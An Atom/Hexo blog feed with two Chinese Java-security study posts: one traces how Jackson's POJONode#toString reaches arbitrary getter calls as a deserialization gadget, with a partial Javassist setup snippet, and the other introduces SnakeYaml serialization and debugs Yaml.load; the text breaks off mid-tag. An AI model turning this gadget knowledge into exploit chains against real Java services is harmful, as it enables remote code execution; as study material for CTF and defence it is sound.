    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-1-说说废话"><a href="#1-1-说说废话" class="headerlink" title="1.1 说说废话"></a>1.1 说说废话</h2><p>由于最近刚入门java安全，学了CC链、CB链，想要去找一些CTF反序列化题目练练手，然后突然发现，原来CC链、CB链不是尽头，只是开始，还有一大堆的链子等着我去结合CC、CB链进行利用；</p><p>通过wp学习反序列化利用的过程中，发现POJONode#toString真的是高频出现啊，真不理解这是啥玩意儿，咋这么好用呢？通过一顿资料搜索发现，原来是Jackson的原生反序列化链子之一，之前学Jackson的时候没看到这个，现在补上；</p><p>这里就不在赘述Jackson反序列化的基础知识了，直接分析相关类的内容；</p><h2 id="1-2-环境"><a href="#1-2-环境" class="headerlink" title="1.2 环境"></a>1.2 环境</h2><ul><li>jdk8u65</li><li>jackson-databind 2.7.9</li><li>jackson-core 2.7.9</li><li>jackson-annotations 2.7.9</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-annotations<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-3-利用限制"><a href="#1-3-利用限制" class="headerlink" title="1.3 利用限制"></a>1.3 利用限制</h2><p>存在jackson环境，目前了解对版本无要求、对jdk版本也无要求</p><h1 id="二、POJONode-toString"><a href="#二、POJONode-toString" class="headerlink" title="二、POJONode#toString"></a>二、POJONode#toString</h1><h2 id="2-1-方法执行流程分析"><a href="#2-1-方法执行流程分析" class="headerlink" title="2.1 方法执行流程分析"></a>2.1 方法执行流程分析</h2><p>首先，说一下POJONode本身是没有重写<code>toString()</code>方法的，所以它调用的<code>toString()</code>方法是它的父类的<code>toString()</code>方法；</p><p>跟进父类<code>ValueNode</code>，发现也没有重写<code>toString()</code>，因此我们继续跟进<code>ValueNode</code>的父类<code>BaseJsonNode</code>类，可以看到<code>toString()</code>方法的具体实现。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1728999034316-9ea0ebe4-a523-4db4-8992-637f1fd37dc6.png"></p><p>继续跟进<code>nodeToString()</code>方法，查看具体实现；可以发现其调用了<code>writeValueAsString()</code>方法进行序列化</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1728999066853-217ab9ed-c10a-45fa-bd6e-54633199682f.png"></p><p>总结一下，<code>POJONode#toString</code>方法执行了对自身对象的序列化；</p><h2 id="2-2-Jackson序列化流程"><a href="#2-2-Jackson序列化流程" class="headerlink" title="2.2 Jackson序列化流程"></a>2.2 Jackson序列化流程</h2><blockquote><p>BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter#writeValueAsString -&gt; ObjectWriter#_writeValueAndClose -&gt; ObjectWriter#serialize -&gt; DefaultSerializerProvider#serializeValue -&gt; DefaultSerializerProvider#serialize -&gt; DefaultSerializerProvider#_serialize -&gt; SerializableSerializer#serialize -&gt; POJONode#serialize -&gt; SerializerProvider#defaultSerializeValue -&gt; JsonSerializer#serialize -&gt;  BeanSerializer#serialize - &gt; BeanSerializerBase#serializeFields -&gt; BeanPropertyWriter#serializeAsFields</p></blockquote><p>在跟这条序列化链子的过程中，发现确实是复杂到了极点，还是不跟了吧。<br>上述知识找到了调用getter的链子，它会调用传入POJONode的对象的所有属性的getter函数，从而实现任意getter调用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1729002357889-c3e328e0-5cd6-4f20-994d-7185acf31613.png"></p><p>具体的对象属性如何获取和getter方法的获取还要继续分析<code>findTypedValueSerializer</code>函数，这边就不分析了，知道结论和用法就结束吧！</p><h1 id="三、POJONode反序列化Gadget"><a href="#三、POJONode反序列化Gadget" class="headerlink" title="三、POJONode反序列化Gadget"></a>三、POJONode反序列化Gadget</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>    <span class="hljs-type">ToGetterClass</span> <span class="hljs-variable">toGetterClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToGetterClass</span>();<br>    <br>    <span class="hljs-comment">//删除 BaseJsonNode#writeReplace 方法用于顺利序列化</span><br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>    ctClass0.removeMethod(writeReplace);<br>    ctClass0.toClass();<br><br>    <span class="hljs-type">POJONode</span> <span class="hljs-variable">pjNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(toGetterClass);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/12509#toc-3">https://xz.aliyun.com/t/12509</a></li><li><a href="https://xz.aliyun.com/t/12966#toc-14">https://xz.aliyun.com/t/12966</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>Jackson</tag>
      
      <tag>Gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml反序列化基础</title>
    <link href="/2024/12/07/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/12/07/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><h2 id="1-1-SnakeYaml-简介"><a href="#1-1-SnakeYaml-简介" class="headerlink" title="1.1 SnakeYaml 简介"></a>1.1 SnakeYaml 简介</h2><p>YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。</p><p>在Java中，有一个用于解析YAML格式的库，即SnakeYaml。</p><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。</p><h2 id="1-2-Yaml-语法与结构"><a href="#1-2-Yaml-语法与结构" class="headerlink" title="1.2 Yaml 语法与结构"></a>1.2 Yaml 语法与结构</h2><p>YAML基本格式要求：</p><ol><li>YAML大小写敏感；</li><li>使用缩进代表层级关系；</li><li>缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li></ol><p>示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">environments:</span><br>    <span class="hljs-attr">dev:</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">http://dev.bar.com</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">Developer</span> <span class="hljs-string">Setup</span><br>    <span class="hljs-attr">prod:</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">http://foo.bar.com</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">My</span> <span class="hljs-string">Cool</span> <span class="hljs-string">App</span><br><span class="hljs-attr">my:</span><br>    <span class="hljs-attr">servers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">dev.bar.com</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">foo.bar.com</span><br></code></pre></td></tr></table></figure><p>YAML支持三种数据结构：</p><p>1、对象</p><p>使用冒号代表，格式为key: value。冒号后面要加一个空格：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">key:</span> <span class="hljs-string">value</span><br></code></pre></td></tr></table></figure><p>可以使用缩进表示层级关系：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">key:</span> <br>    <span class="hljs-attr">child-key:</span> <span class="hljs-string">value</span><br>    <span class="hljs-attr">child-key2:</span> <span class="hljs-string">value2</span><br></code></pre></td></tr></table></figure><p>2、数组</p><p>使用一个短横线加一个空格代表一个数组项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hobby:<br>    - Java<br>    - LOL<br></code></pre></td></tr></table></figure><p>3、常量</p><p>YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">boolean:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">TRUE</span>  <span class="hljs-comment">#true,True都可以</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">FALSE</span>  <span class="hljs-comment">#false，False都可以</span><br><span class="hljs-attr">float:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">3.14</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">6.8523015e+5</span>  <span class="hljs-comment">#可以使用科学计数法</span><br><span class="hljs-attr">int:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">123</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">0b1010_0111_0100_1010_1110</span>    <span class="hljs-comment">#二进制表示</span><br><span class="hljs-attr">null:</span><br>    <span class="hljs-attr">nodeName:</span> <span class="hljs-string">&#x27;node&#x27;</span><br>    <span class="hljs-attr">parent:</span> <span class="hljs-string">~</span>  <span class="hljs-comment">#使用~表示null</span><br><span class="hljs-attr">string:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">哈哈</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Hello world&#x27;</span>  <span class="hljs-comment">#可以使用双引号或者单引号包裹特殊字符</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">newline</span><br>      <span class="hljs-string">newline2</span>    <span class="hljs-comment">#字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="hljs-attr">date:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">2018-02-17</span>    <span class="hljs-comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="hljs-attr">datetime:</span> <br>    <span class="hljs-bullet">-</span>  <span class="hljs-number">2018-02-17T15:02:31+08:00</span>    <span class="hljs-comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></code></pre></td></tr></table></figure><p>更多的关于YAML的语法及使用可参考：<a href="https://www.yiibai.com/yaml">https://www.yiibai.com/yaml</a></p><h1 id="二、SnakeYaml-序列化与反序列化"><a href="#二、SnakeYaml-序列化与反序列化" class="headerlink" title="二、SnakeYaml 序列化与反序列化"></a>二、SnakeYaml 序列化与反序列化</h1><h2 id="2-1-SnakeYaml-序列化和反序列化实践"><a href="#2-1-SnakeYaml-序列化和反序列化实践" class="headerlink" title="2.1 SnakeYaml 序列化和反序列化实践"></a>2.1 SnakeYaml 序列化和反序列化实践</h2><p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。</p><ul><li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；</li><li>Yaml.dump()：将一个对象转化为yaml文件形式；</li></ul><p>下面使用的环境是用的 SnakeYaml 1.33 版本</p><ul><li>User 类，拥有一个name属性及其setter方法和getter方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> SnakeYamlDeserialization</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.User.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/11/20 21:22</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>snakeTest.java，序列化新建的User对象为yaml格式内容</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> SnakeYamlDeserialization</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.snakeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/11/20 21:23</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snakeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;candy&quot;</span>);<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> yaml.dump(user);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>输出结果</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!!com.candy.User &#123;name: candy&#125;<br></code></pre></td></tr></table></figure><p>输出yaml格式的内容，<strong>这里”!!”用于强制类型转化，”!!User”是将该对象转为User类，如果没有”!”则就是个key为字符串的Map</strong>；</p><p>修改 snakeTest.java 程序，反序列化一下输出的 User 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.omg.PortableInterceptor.USER_EXCEPTION;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> SnakeYamlDeserialization</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.snakeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/11/20 21:23</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snakeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.candy.User &#123;name: candy&#125;&quot;</span>;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>        System.out.println(user + <span class="hljs-string">&quot;: &quot;</span> + user.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出，看到成功反序列化出User对象：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">com.candy.User@64a294a6:</span> <span class="hljs-string">candy</span><br></code></pre></td></tr></table></figure><h2 id="2-2-SnakeYaml-反序列化的类方法调用"><a href="#2-2-SnakeYaml-反序列化的类方法调用" class="headerlink" title="2.2 SnakeYaml 反序列化的类方法调用"></a>2.2 SnakeYaml 反序列化的类方法调用</h2><p>类比下Fastjson和Jackson的反序列化的类方法调用，这里我们也试下Yaml.load()在调用时会调用将要反序列化的类的哪些方法。</p><ul><li>修改 User 类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> SnakeYamlDeserialization</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.User.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/11/20 21:22</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了User#getName方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了User#setName方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了User#getAge方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了User#setAge方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>修改 snakeTest.java</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.omg.PortableInterceptor.USER_EXCEPTION;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> SnakeYamlDeserialization</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.snakeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/11/20 21:23</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">snakeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.candy.User &#123;age: 18, name: candy&#125;&quot;</span>;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>        System.out.println(user + <span class="hljs-string">&quot;: &quot;</span> + user.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出看到，调用了反序列化的类的构造函数和yaml格式内容中包含的属性的setter方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">调用了User#setAge方法<br>调用了User#setName方法<br>调用了User#getName方法<br>com.candy.User@6ae40994: candy<br></code></pre></td></tr></table></figure><h2 id="2-3-SnakeYaml反序列化过程调试分析"><a href="#2-3-SnakeYaml反序列化过程调试分析" class="headerlink" title="2.3 SnakeYaml反序列化过程调试分析"></a>2.3 SnakeYaml反序列化过程调试分析</h2><p>SnakeYaml反序列化的实现主要是通过反射机制来查找对应的Java类，新建一个实例并将对应的属性值赋给该实例。</p><p>在前面的反序列化Demo中，在<code>User user = yaml.load(s);</code>上打上断点开始调试。</p><p>在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071112406.png"></p><p>在loadFromReader()函数中，调用了 Baseconstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071112705.png"></p><p>跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071112007.png"></p><p>通过<code>F7</code>继续跟进<code>this.constructDocument</code>跟进具体的反序列化过程，在该函数中可以看到通过<code>this.constructObject()</code>函数调用构造对象后直接返回，可以知道<code>this.constructObject()</code>实现了这个反序列化过程；继续跟进</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071112348.png"></p><p>通过<code>F7</code>跟进<code>this.constructObject()</code>；这个函数只有一个简单的判断，然后就继续执行，跟进只有一个<code>hashCode</code>函数，然后就执行了<code>this.constructObjectNoCheck()</code></p><p><img 